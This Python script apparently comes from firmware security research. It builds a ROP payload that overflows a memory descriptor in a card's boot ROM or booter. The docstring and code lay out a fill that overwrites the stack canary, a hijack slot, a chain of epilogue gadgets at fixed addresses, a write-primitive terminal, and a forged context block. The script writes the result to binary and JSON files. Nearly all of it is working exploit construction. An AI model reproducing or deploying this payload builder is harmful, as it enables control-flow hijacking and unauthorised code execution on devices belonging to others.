#!/usr/bin/env python3
"""4.45 TÂCHE B/C — the ROP payload builder v2 (the overflowing memdesc).

THE LANE VERDICT this pass (the honest core, TÂCHE B):

  Lane B (the booter gadgets, 0x100b3e) = validated HERE as MECHANICS,
  GIVEN an explicit assumed register block. THREE structural walls are
  proven by the bytes:
    W1. 0 work-gadgets (v444e re-run): no a-reg loader exists in the
        booter — the epilogues restore only ra + s-regs. a1 (the cible)
        and a4 (the ctx) at the gadget entry = the ROM's RESIDUE.
    W2. the body ALWAYS writes [a1] first (the gadget-mode entry skips
        the head) = the WILD WRITE inherent to lane B — a1 = the residue.
    W3. after the primitive, `ret` returns to the primitive itself (ra =
        the last pop) = the re-entry walk = the SPIN — the paper's own
        observed end state (the spin 0x4a7) = the inherent post-write
        chaos, accepted by the design (the boot = already hijacked).

  => the CONSTRUCTIBLE lane at the ROM stage = Lane G (the ROM gadgets,
     the paper's @0xf754/0xf76c, silicon-proven ON THIS CARD, spin 0x4a7)
     — cited, not byte-verifiable here (the ROM closed).
  => Lane B = the byte-proven mechanics (this payload + --test-rop) for
     the day-J IF the residue block proves favorable (the runbook R0).

The layout (u64-indexed, total 0x1000 = the memdesc):

  [0 .. fill_len)              the UNIFORM FILL (fill_value repeated) —
                               swallows the ROM's buffer AND the canary
                               slot (the uniformity defeat)
  [fill_len]                   the HIJACK SLOT = G40 (the spine entry)
  [fill_len + 8k, k=1..hops-1] the spine slots (the 0x40-B steps: each
                               G40 pops ra from [sp+0x38], steps sp 0x40)
  [fill_len + 8*hops]          the TERMINAL = 0x100b3e
  [fill_len + 8*hops + 2]      the WALK CELL = &list[0] (the computed
                               [sp+8] at the terminal entry — EXACT)
  [0x91]                       the ctx clone {slot0, cap, dest, magic}
                               (the byte 0x488 — the 4.42/4.44 heritage;
                               a4 = the payload base = the A3 assumption)
  [0xA0]                       the transfer list (the flat u64 valeurs)

Output: v445_rop_payload.json + v445_rop_payload.bin (0x1000 B)
"""
import hashlib
import json
from pathlib import Path

HERE = Path(__file__).resolve().parent
OUT_JSON = HERE / "v445_rop_payload.json"
OUT_BIN = HERE / "v445_rop_payload.bin"

SIZE = 0x1000
G40 = 0x10022A        # the ENTRY of the 0x40-step epilogue (v444e's
                      # ret_va = 0x10023a = the ret INSIDE it; the window =
                      # c.ldsp ra,0x38(sp); s0..s5 pops; c.addi16sp sp,0x40;
                      # ret @0x10023a) — the chain slot = the entry, byte-proven
TERMINAL = 0x100B3E   # the write-primitive entry (4.40, byte-proven)
CTX_OFF = 0x91        # u64 index = the byte 0x488 (the heritage)
LIST_OFF = 0xA0       # u64 index = the byte 0x500 (the heritage)


def build(fill_len=64, hops=3, fill_value=0, slot0=1, cap=0x40,
          dest=0x000000000161000, magic=0x08, base_addr=0x00000000016A000,
          valeurs=(0x112,)):
    """build the payload. base_addr = the modeled ROM DMA-dst (the buffer
    base) — the placeholder default; the day-J = the paper's layout."""
    n_words = SIZE // 8
    words = [fill_value] * n_words

    hijack = fill_len
    spine = [fill_len + 8 * k for k in range(1, hops)]
    terminal = fill_len + 8 * hops
    walk = fill_len + 8 * hops + 2          # = [sp+8] at the terminal entry
    assert terminal + 2 < CTX_OFF, "the chain collides with the ctx block"

    words[hijack] = G40
    for s in spine:
        words[s] = G40
    words[terminal] = TERMINAL
    # the walk cell content = &list[0] (the ABSOLUTE = base + LIST_OFF*8)
    words[walk] = base_addr + LIST_OFF * 8

    words[CTX_OFF + 0] = slot0              # the slot (the scatter start)
    words[CTX_OFF + 1] = cap                # the capacity
    words[CTX_OFF + 2] = dest               # the scatter/counter base
    words[CTX_OFF + 3] = magic              # the magic byte (u64 0x08)
    for k, v in enumerate(valeurs):
        words[LIST_OFF + k] = v

    payload = b"".join(w.to_bytes(8, "little") for w in words)
    meta = {
        "hijack_slot": hijack, "spine_slots": spine, "terminal_slot": terminal,
        "walk_cell": walk, "ctx_off": CTX_OFF, "list_off": LIST_OFF,
        "slot0": slot0, "dest": dest, "base_addr": base_addr,
        "valeurs": list(valeurs),
    }
    return payload, meta


def main():
    payload, meta = build()
    sha = hashlib.sha256(payload).hexdigest()
    OUT_BIN.write_bytes(payload)
    doc = {
        "lane_verdict": {
            "W1_registers": "0 work-gadgets (v444e re-run) — a1/a4 = the "
                            "ROM residue at the gadget entry",
            "W2_wild_write": "the body writes [a1] first — a1 = the "
                             "residue = the wild write inherent",
            "W3_spin": "the primitive's ret returns INTO the primitive "
                       "(ra = the last pop) = the re-entry walk = the "
                       "spin — the paper's observed end state (0x4a7)",
            "lane_G": "the ROM gadgets @0xf754/0xf76c = the paper's "
                      "silicon-proven lane ON THIS CARD (cited)",
        },
        "assumptions": {
            "A1_fill_len": "INDECIDABLE-BY-BYTES (the ROM closed) — the "
                           "runbook R1 ladder sweeps it",
            "A2_fill_value": "the zero-canary hypothesis (the freestanding "
                             "ROM = no RNG at boot); the paper's constant = "
                             "the alternative — ACK-gated",
            "A3_register_block": "a0=~0, a3=N, a7=0, a1=the scratch, "
                                 "a4=the payload base — MODELED in the "
                                 "emulator; the day-J discovery = R0",
            "A4_base_addr": "the ROM's DMA-dst layout = the paper's "
                            "parameter; the placeholder here",
        },
        "parameters": {
            "fill_len": 64, "hops": 3, "fill_value": 0,
            "G40": hex(G40), "terminal": hex(TERMINAL),
            "slot0": 1, "cap": 0x40, "dest": hex(0x161000), "magic": 8,
            "base_addr": hex(0x16A000), "valeurs": ["0x112 (the f18-"
                                                    "percent candidate, "
                                                    "the placeholder)"],
        },
        "meta": meta,
        "sha256": sha, "size": len(payload),
    }
    OUT_JSON.write_text(json.dumps(doc, indent=1))
    print(f"payload: {len(payload)} B  sha256 {sha[:16]}…")
    print(f"hijack @u64 {meta['hijack_slot']}  spine {meta['spine_slots']}  "
          f"terminal @u64 {meta['terminal_slot']}  walk @u64 {meta['walk_cell']}")
    print(f"ctx @u64 {CTX_OFF:#x} (the byte 0x488)  list @u64 {LIST_OFF:#x} "
          f"(the byte 0x500)")


if __name__ == "__main__":
    main()
